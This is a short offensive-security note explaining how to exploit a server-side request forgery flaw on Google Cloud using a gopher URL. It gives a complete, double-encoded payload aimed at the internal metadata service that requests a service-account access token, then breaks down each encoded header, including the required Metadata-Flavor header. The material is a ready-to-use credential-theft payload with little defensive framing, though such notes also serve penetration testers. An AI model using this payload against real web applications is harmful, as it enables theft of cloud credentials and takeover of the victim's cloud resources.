# SSRF using Gopher protocol

### If we successfully detect a SSRF vulnerability in a web app and the web app is hosted on GCP, we may use specific protocols and URLs to request specific information, depending on the case.

### URLs:

 - gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/service-accounts/<snip>-compute@developer.gserviceaccount.com/token%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a

## Protocol and Target: gopher://metadata.google.internal:80/ 

#### This part of the payload specifies that the Gopher protocol is being used to make a request to metadata.google.internal on port 80. As mentioned, metadata.google.internal is a special domain used internally by Google Cloud services to provide metadata information to VM instances.

## Crafted Request: GET /computeMetadata/v1/instance/service-accounts/SERVICE_ACCOUNT/token 

#### This is a GET request to the Google Cloud metadata service API, requesting an access token associated with a service account. We need to find out what service account is associated with the VM.

## %2520HTTP%252f%2531%252e%2531 

#### This is an encoded form of " HTTP/1.1"

## %250AHost:%2520metadata.google.internal 

#### This is an encoded header specifying the host.

## %250AAccept:%2520%252a%252f%252a 

#### Encoded header for the Accept field, indicating that any media type is acceptable in response.

## %250aMetadata-Flavor:%2520Google 

#### Importantly this sets the header that is required to access the metadata service.
